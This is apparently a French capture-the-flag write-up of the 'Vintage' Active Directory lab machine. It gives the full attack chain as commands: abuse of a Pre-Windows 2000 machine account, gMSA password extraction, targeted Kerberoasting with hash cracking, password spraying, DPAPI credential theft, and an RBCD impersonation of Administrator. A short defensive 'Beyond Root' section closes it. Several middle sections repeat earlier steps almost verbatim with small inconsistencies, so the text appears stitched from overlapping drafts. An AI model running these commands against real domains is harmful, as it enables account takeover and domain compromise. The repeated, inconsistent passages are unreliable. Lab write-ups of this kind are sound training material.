![Cover](cover.png)

### 1. Scanning & Énumération

La phase de reconnaissance commence par un scan **Nmap** exhaustif pour identifier la surface d'attaque de la cible Windows.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 10.10.11.45

# Scan de services détaillé sur les ports identifiés
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV 10.10.11.45
```

L'analyse des services confirme la présence d'un **Domain Controller** (DC01) pour le domaine **vintage.htb**. Un point critique est relevé immédiatement : le **Message Signing** est requis sur le SMB et l'authentification **NTLM** semble désactivée ou restreinte, imposant l'usage de **Kerberos**.

J'ajoute les entrées correspondantes dans mon fichier `/etc/hosts` :
`10.10.11.45 DC01 DC01.vintage.htb vintage.htb`

### 2. Validation des Credentials Initiaux

Le scénario fournit un set de credentials : `P.Rosa / Rosaisbest123`. Comme suspecté, une tentative de connexion SMB classique échoue avec une erreur `STATUS_NOT_SUPPORTED` car le serveur refuse le **NTLM SSP**. Je dois utiliser le flag `-k` pour forcer l'authentification **Kerberos** (nécessite un ticket ou une résolution DNS parfaite du FQDN).

```bash
# Validation via Kerberos (NXC)
netexec smb dc01.vintage.htb -u P.Rosa -p Rosaisbest123 -k
```

Une fois l'accès validé, j'énumère les **SMB Shares**. Les partages par défaut (`SYSVOL`, `NETLOGON`) sont accessibles en lecture mais ne contiennent aucune information sensible immédiate.

### 3. Énumération Active Directory (Bloodhound)

J'utilise **BloodHound.py** pour collecter les données du domaine. Malgré les restrictions d'authentification, l'outil parvient à extraire les objets via LDAP en utilisant les credentials de `P.Rosa`.

```bash
bloodhound-ce-python -c all -d vintage.htb -u P.Rosa -p Rosaisbest123 -ns 10.10.11.45 --zip
```

L'analyse des données révèle un vecteur intéressant : l'objet computer **FS01$** est membre du groupe **Pre-Windows 2000 Compatible Access**.

> **Schéma Mental : Exploitation Pre-Windows 2000**
> Dans les environnements AD anciens ou mal configurés, les comptes de machines créés avec cette compatibilité ont souvent un mot de passe par défaut prévisible : le nom de la machine en minuscules (sans le symbole `$`).
> **Logique :** Hostname `FS01` -> Password probable `fs01`.

Je vérifie cette hypothèse via LDAP :
```bash
netexec ldap vintage.htb -u 'FS01$' -p fs01 -k
```
La connexion est un succès. J'ai maintenant le contrôle d'un compte machine.

### 4. Extraction du mot de passe GMSA

L'analyse Bloodhound montre que **FS01$** possède le droit **ReadGMSAPassword** sur le compte de service managé **gMSA01$**. Les **Group Managed Service Accounts (GMSA)** sont conçus pour que Windows gère automatiquement la rotation des mots de passe, mais les membres autorisés peuvent extraire le hash NT du compte.

> **Schéma Mental : Extraction GMSA**
> 1. Obtenir un TGT pour le compte autorisé (FS01$).
> 2. Interroger l'attribut `msDS-ManagedPassword` sur l'objet GMSA.
> 3. Décoder le blob binaire pour obtenir le NT Hash.

J'utilise **bloodyAD** pour extraire directement le hash :

```bash
# Extraction du hash NT de gMSA01$ via FS01$
bloodyAD -d vintage.htb --host dc01.vintage.htb -u 'fs01$' -p fs01 -k get object 'gmsa01$' --attr msDS-ManagedPassword
```
Le hash récupéré est : `b3a15bbdfb1c53238d4b50ea2c4d1178`.

### 5. Escalade vers SVC_SQL via Targeted Kerberoasting

Le compte **gMSA01$** possède des privilèges de **GenericWrite** sur le groupe **ServiceManagers**. Ce groupe a lui-même un contrôle total (**GenericAll**) sur plusieurs comptes de service, dont `svc_sql`.

Cependant, `svc_sql` est désactivé (`ACCOUNTDISABLE`). Ma stratégie est la suivante :
1. Ajouter **gMSA01$** au groupe **ServiceManagers**.
2. Réactiver le compte `svc_sql`.
3. Effectuer un **Targeted Kerberoast** (ajouter un SPN si nécessaire et demander un ticket TGS).

```bash
# 1. Ajout au groupe
bloodyAD -d vintage.htb -u 'GMSA01$' -p b3a15bbdfb1c53238d4b50ea2c4d1178 -k --host dc01.vintage.htb -f rc4 add groupMember ServiceManagers 'GMSA01$'

# 2. Réactivation du compte svc_sql
bloodyAD -d vintage.htb -u 'GMSA01$' -p b3a15bbdfb1c53238d4b50ea2c4d1178 -k --host dc01.vintage.htb -f rc4 remove uac svc_sql -f ACCOUNTDISABLE

# 3. Targeted Kerberoasting
# On utilise targetedKerberoast.py avec le TGT de gMSA01$
getTGT.py -hashes :b3a15bbdfb1c53238d4b50ea2c4d1178 'vintage.htb/gmsa01$'
export KRB5CCNAME=gmsa01$.ccache
targetedKerberoast.py -d vintage.htb -k --no-pass --dc-host dc01.vintage.htb
```

Le hash TGS de `svc_sql` est récupéré. Je lance **Hashcat** (Mode 13100) avec la liste `rockyou.txt`.
Le mot de passe cracké est : **Zer0the0ne**.

### 6. Brèche Initiale : Password Spraying

Dans un environnement AD, la réutilisation de mots de passe est fréquente. Je tente un **Password Spraying** du mot de passe `Zer0the0ne` sur l'ensemble des utilisateurs énumérés précédemment.

```bash
# Récupération de la liste des utilisateurs
netexec smb dc01.vintage.htb -u P.Rosa -p Rosaisbest123 -k --users > users.txt

# Spraying du mot de passe identifié
netexec smb dc01.vintage.htb -u users.txt -p Zer0the0ne -k --continue-on-success
```

Le spray révèle que l'utilisateur **C.Neri** utilise le même mot de passe. Ce compte me permet d'obtenir mon premier shell stable et d'accéder au flag utilisateur.

```bash
# Accès via WinRM
netexec winrm dc01.vintage.htb -u C.Neri -p Zer0the0ne -k
```

---

### Énumération Initiale & Pivot via FS01

L'accès initial est fourni via les identifiants **P.Rosa / Rosaisbest123**. Une tentative de connexion via **SMB** révèle que l'authentification **NTLM** est désactivée sur le **Domain Controller**. Je dois impérativement utiliser **Kerberos**.

```bash
# Validation des credentials via Kerberos
netexec smb dc01.vintage.htb -u P.Rosa -p Rosaisbest123 -k
```

L'exécution de **BloodHound** (version Python) permet de cartographier l'**Active Directory**. L'analyse des objets révèle un ordinateur nommé `FS01.vintage.htb` membre du groupe **Pre-Windows 2000 Compatible Access**. Cette configuration implique souvent que le mot de passe de l'objet machine est identique au nom d'hôte en minuscules (sans le symbole `$`).

```bash
# Vérification du mot de passe machine par défaut
netexec ldap vintage.htb -u 'FS01$' -p fs01 -k
```

---

### Extraction du mot de passe GMSA

L'objet `FS01$` possède le droit **ReadGMSAPassword** sur le compte de service managé **gMSA01$**. Pour extraire ce secret, je génère d'abord un fichier de configuration Kerberos et j'obtiens un **TGT** pour `FS01$`.

> **Schéma Mental :**
> P.Rosa (Low Priv) -> BloodHound -> Identification de FS01 (Pre-2000) -> Compromission de FS01$ -> Lecture du mot de passe de gMSA01$ via LDAP.

```bash
# Génération du ticket Kerberos pour FS01$
echo "fs01" | kinit 'fs01$'

# Extraction du hash NTLM de gMSA01 via bloodyAD
bloodyAD -d vintage.htb --host dc01.vintage.htb -k ccache=/tmp/krb5cc_1000 get object 'gmsa01$' --attr msDS-ManagedPassword
```
*Note : Le hash récupéré pour gMSA01$ est `b3a15bbdfb1c53238d4b50ea2c4d1178`.*

---

### Escalade de Privilèges : Targeted Kerberoasting

Le compte **gMSA01$** dispose des permissions **GenericWrite** et **AddSelf** sur le groupe `ServiceManagers`. Ce groupe possède lui-même un accès **GenericAll** sur plusieurs comptes de service, dont `SVC_SQL`.

#### 1. Manipulation de groupe et activation de compte
Je commence par ajouter **gMSA01$** au groupe `ServiceManagers`. Le compte `SVC_SQL` étant désactivé par défaut, je dois modifier son **User Account Control (UAC)** pour le rendre opérationnel avant l'attaque.

```bash
# Ajout au groupe ServiceManagers
bloodyAD -d vintage.htb -k --host dc01.vintage.htb -u 'GMSA01$' -p b3a15bbdfb1c53238d4b50ea2c4d1178 -f rc4 add groupMember ServiceManagers 'GMSA01$'

# Récupération d'un nouveau TGT (pour actualiser les groupes) et activation de SVC_SQL
getTGT.py -k -hashes :b3a15bbdfb1c53238d4b50ea2c4d1178 'vintage.htb/gmsa01$'
export KRB5CCNAME=gmsa01$.ccache
bloodyAD -d vintage.htb -k --host "dc01.vintage.htb" remove uac svc_sql -f ACCOUNTDISABLE
```

#### 2. Attaque Targeted Kerberoast
Une fois le compte activé, j'effectue un **Targeted Kerberoasting**. Si le compte n'a pas de **Service Principal Name (SPN)**, je peux en injecter un, mais l'outil `targetedKerberoast.py` automatise ce processus.

```bash
# Exécution du Kerberoasting ciblé
targetedKerberoast.py -d vintage.htb -k --no-pass --dc-host dc01.vintage.htb
```

> **Schéma Mental :**
> gMSA01$ -> GenericWrite sur ServiceManagers -> Activation de SVC_SQL -> Injection de SPN -> Requête de TGS (Kerberoast) -> Crack hors-ligne.

Le hash obtenu est cracké via **hashcat** avec la liste `rockyou.txt`, révélant le mot de passe : **Zer0the0ne**.

---

### Mouvement Latéral : Password Spraying

Dans un environnement AD, la réutilisation de mots de passe entre comptes de service et comptes utilisateurs est une faiblesse critique. Je récupère la liste des utilisateurs du domaine via **LDAP** ou les données **BloodHound** précédemment extraites, puis je teste le mot de passe de `SVC_SQL` sur l'ensemble des comptes.

```bash
# Extraction de la liste des samaccountname
cat bloodhound_users.json | jq '.data[].Properties.samaccountname' -r > users.txt

# Password Spraying via Kerberos
netexec smb dc01.vintage.htb -u users.txt -p Zer0the0ne -k --continue-on-success
```

L'attaque par **Password Spray** confirme que l'utilisateur **C.Neri** utilise le même mot de passe. Ce compte me permet de stabiliser mon accès sur le domaine et de poursuivre l'énumération vers les privilèges administratifs.

---

### Phase 3 : Élévation de Privilèges & Domination

Après avoir compromis le compte **svc_sql** via un **Targeted Kerberoasting** et effectué un **Password Spraying**, j'obtiens un accès en tant que **C.Neri**. Ce compte constitue le point de pivot vers l'extraction de secrets locaux et la manipulation de délégations **Active Directory**.

#### 1. Extraction DPAPI & Escalation vers L.Bianchi_adm

L'utilisateur **C.Neri** possède des secrets enregistrés dans le **Windows Credential Manager**. Ces données sont protégées par l'**API Data Protection (DPAPI)**. Pour les récupérer, je dois extraire la **MasterKey** de l'utilisateur, puis déchiffrer le blob de credentials.

> **Schéma Mental : Extraction DPAPI**
> `Session Utilisateur` -> `Extraction du GUID de la MasterKey` -> `Récupération de la MasterKey (via mot de passe ou RPC)` -> `Déchiffrement du Credential Blob` -> `Plaintext Password`.

```powershell
# Énumération des credentials stockés
vaultcmd /list
# Extraction via SharpDPAPI (ou Mimikatz)
SharpDPAPI.exe credentials /password:Zer0the0ne
```

L'extraction révèle le mot de passe de **L.Bianchi_adm**. Ce compte dispose de privilèges plus élevés, notamment la capacité de modifier l'appartenance à certains groupes sensibles.

#### 2. Resource-Based Constrained Delegation (RBCD)

L'analyse **Bloodhound** montre que **L.Bianchi_adm** peut ajouter des objets à un groupe spécifique. Ce groupe possède le droit de modifier l'attribut `msDS-AllowedToActOnBehalfOfOtherIdentity` sur le **Domain Controller** (DC01). C'est le vecteur parfait pour une attaque **RBCD**.

> **Schéma Mental : Attaque RBCD**
> 1. `Compte Privilégié` -> Ajoute un `Fake Computer` (MAQ > 0).
> 2. `Fake Computer` -> Configuré dans l'attribut `msDS-AllowedToActOnBehalfOfOtherIdentity` du DC.
> 3. `S4U2Self / S4U2Proxy` -> Demande d'un **Service Ticket** pour l'utilisateur **Administrator** sur le DC.

**Étape A : Création du compte machine fictif**
J'utilise **impacket-addcomputer** pour créer un nouvel objet ordinateur dans le domaine.

```bash
impacket-addcomputer -dc-ip 10.10.11.45 -computer-name 'EVILCOMP$' -computer-pass 'P@ssword123!' 'vintage.htb/L.Bianchi_adm:MotDePasseExtrait'
```

**Étape B : Configuration de la délégation**
Je configure le **Domain Controller** pour qu'il accepte les tickets d'impersonnalisation provenant de mon nouvel ordinateur.

```bash
# Via BloodyAD ou impacket-rbcd
impacket-rbcd -delegate-to 'DC01$' -delegate-from 'EVILCOMP$' -action 'write' 'vintage.htb/L.Bianchi_adm:MotDePasseExtrait'
```

**Étape C : Impersonnalisation de l'Administrateur**
J'utilise le protocole **Kerberos** (S4U2Proxy) pour obtenir un ticket de service pour le compte **Administrator**.

```bash
# Obtention du ticket via S4U
impacket-getST -spn 'cifs/dc01.vintage.htb' -impersonate 'Administrator' 'vintage.htb/EVILCOMP$:P@ssword123!'

# Injection du ticket et accès final
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass dc01.vintage.htb
```

---

### Analyse Post-Exploitation "Beyond Root"

La compromission totale de **Vintage** met en lumière plusieurs faiblesses structurelles critiques dans une architecture **Active Directory** moderne :

1.  **GMSA & Pre-Windows 2000 Compatibility** : L'utilisation du groupe **Pre-Windows 2000 Compatible Access** est un risque majeur. En permettant à des objets anonymes ou faiblement authentifiés de lire des attributs, on expose des vecteurs vers les comptes **GMSA**. Bien que les **GMSA** soient conçus pour la sécurité (mots de passe complexes et gérés), le droit `ReadGMSAPassword` accordé à un groupe trop large annule totalement cette protection.
2.  **Targeted Kerberoasting sur comptes désactivés** : Une erreur courante est de penser qu'un compte désactivé est inoffensif. Tant qu'un **Service Principal Name (SPN)** est présent, le compte peut être **Kerberoasted**. La réactivation via des droits de type `GenericWrite` ou `AccountOperator` permet ensuite d'utiliser le mot de passe cracké.
3.  **Persistance via RBCD** : Le **Resource-Based Constrained Delegation** est souvent moins surveillé que la délégation traditionnelle. Le fait qu'un utilisateur puisse modifier cet attribut sur un **Domain Controller** est une configuration catastrophique. Dans un environnement durci, l'attribut `msDS-AllowedToActOnBehalfOfOtherIdentity` ne devrait jamais être modifiable par un utilisateur standard ou un administrateur de second rang.
4.  **Hygiène DPAPI** : La présence de credentials administratifs dans le **Credential Manager** d'un utilisateur non-admin (**C.Neri**) facilite le mouvement latéral. L'utilisation de **LAPS** (Local Administrator Password Solution) et la restriction des sessions administratives sur les postes de travail auraient pu prévenir cette escalade.